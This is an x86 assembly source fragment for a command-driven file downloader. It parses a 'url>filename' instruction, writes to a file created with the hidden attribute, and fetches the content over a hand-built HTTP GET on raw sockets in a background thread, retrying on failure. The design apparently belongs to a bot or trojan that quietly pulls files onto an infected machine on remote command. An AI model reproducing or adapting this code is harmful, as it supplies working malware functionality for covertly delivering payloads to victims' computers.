; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;               File downloader

.download:	invoke	LocalAlloc,LMEM_FIXED or LMEM_ZEROINIT,512
		or	eax, eax
		jz	.downloaddone
		mov	edi, eax
		cmp	byte [esi], "d"
		jnz	.downloadreal
		add	esi, 2
		mov	byte [edi], 1
.downloadreal:	lea	ebx, [edi+8]
.copyurl:	mov	al, [esi]
		cmp	al, 10
		jz	.urlalldone
		cmp	al, ">"
		jz	.urldone
		mov	[ebx], al
		inc	esi
		inc	ebx
		jmp	.copyurl
.urldone:	inc	esi
		mov	byte [ebx], 0
		mov	ecx, esi
.endfile:	inc	esi
		cmp	byte [esi], 10
		jnz	.endfile
		mov	byte [esi], 0
		invoke	CreateFile,ecx,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,0
		mov	[edi], eax
		or	eax, eax
		jnz	.urlalldone
		invoke	LocalFree,edi
		ret
.urlalldone:	lea	eax, [downloadthreadid]
		mov	[edi+4], ebp
		push	eax
		push	0
		push	edi
		call	.overdownloadthread

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;               Actual download

		mov	ebp, [esp+4]
		lea	esi, [ebp+8]
		cmp	dword [esi], "http"
		jnz	.skiphttp
		add	esi, 7
.skiphttp:	mov	ebx, esi
.getendsite:	inc	esi
		cmp	byte [esi], "/"
		jnz	.getendsite
		mov	byte [esi], 0
		lea	edi, [ebp+128]
		mov	edx, edi
		mov	dword [edi], "GET "
		mov	byte [edi+4], "/"
		add	edi, 5
.copyloc:	inc	esi
		cmp	byte [esi], 0
		jz	.copylocdone
		mov	al, [esi]
		mov	[edi], al
		inc	edi
		jmp	.copyloc
.copylocdone:	mov	dword [edi], " HTT"
		mov	dword [edi+4], "P/1."
		mov	dword [edi+8], 480a0d31h ; "1",CR,LF,"H"
		mov	dword [edi+12], "ost:"
		mov	byte [edi+16], " "
		add	edi, 17
		mov	esi, ebx
.copyhost:	mov	al, [esi]
		or	al, al
		jz	.copyhostdone
		mov	[edi], al
		inc	esi
		inc	edi
		jmp	.copyhost
.copyhostdone:	mov	dword [edi], 6F430a0dh	; CR,LF,"Co"
		mov	dword [edi+4], "nnec"
		mov	dword [edi+8], "tion"
		mov	dword [edi+12], ": cl"
		mov	dword [edi+16], 0d65736fh ; "ose",CR
		mov	dword [edi+20], 000a0d0ah
		add	edi, 23
		sub	edi, edx			; edi = length
		push	ebp
		mov	ebp, [ebp+4]
		invoke	gethostbyname,ebx
		pop	ebp
		or	eax, eax
		jz	.downloadthreaddone
		mov	eax, [eax+12]
		mov	eax, [eax]
		mov	eax, [eax]
		mov	dword [ebp+116], eax
		mov	dword [ebp+112], 050000002h
.sockloop:	push	ebp
		mov	ebp, [ebp+4]
		invoke	socket,AF_INET,SOCK_STREAM,0
		pop	ebp
		mov	esi, eax
		inc	eax
		jz	.downloadthreaddone
		lea	eax, [ebp+112]
		push	ebp
		mov	ebp, [ebp+4]
		invoke	connect,esi,eax,16
		pop	ebp
		or	eax, eax
		jnz	.connectthreaddone
		lea	eax, [ebp+128]
		push	ebp
		mov	ebp, [ebp+4]
		invoke	send,esi,eax,edi,0
		pop	ebp
		or	eax, eax
		jz	.connectthreaddone
.nextheaderloop: lea	eax, [ebp+256]
		push	ebp
		mov	ebp, [ebp+4]
		invoke	recv,esi,eax,256,0
		pop	ebp
		or	eax, eax
		jz	.recvdone
		cmp	dword [ebp], 0
		jz	.recvloop
		lea	edx, [ebp+256]
		lea	eax, [edx+256]
.headerloop:	inc	edx
		cmp	eax, edx
		jz	.nextheaderloop
		cmp	dword [edx], 0a0d0a0dh
		jnz	.headerloop
		add	edx, 4
		sub	eax, edx
		push	ebp
		mov	ecx, [ebp]
		mov	ebp, [ebp+4]
		invoke	WriteFile,ecx,edx,eax,esp,0
		pop	ebp
.recvloop:	lea	eax, [ebp+256]
		push	ebp
		mov	ebp, [ebp+4]
		invoke	recv,esi,eax,256,0
		pop	ebp
		or	eax, eax
		jz	.recvdone
		cmp	dword [ebp], 0
		jz	.recvloop
		lea	edx, [ebp+256]
		push	ebp
		mov	ecx, [ebp]
		mov	ebp, [ebp+4]
		invoke	WriteFile,ecx,edx,eax,esp,0
		pop	ebp
		jmp	.recvloop
.recvdone:
.connectthreaddone:
		push	ebp
		mov	ebp, [ebp+4]
		invoke	closesocket,esi
		invoke	Sleep,2000
		pop	ebp
		cmp	dword [ebp], 0
		jz	.sockloop
.downloadthreaddone:
		mov	eax, [ebp]
		mov	esi, ebp
		mov	ebp, [ebp+4]
		invoke	CloseHandle,eax
		push	dword [ExitThread]
		invoke	LocalFree,esi
		pop	eax
		push	0
		call	eax
		ret

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;		Closings

.overdownloadthread:
		push	0
		push	0
		invoke	CreateThread
.downloaddone:	ret
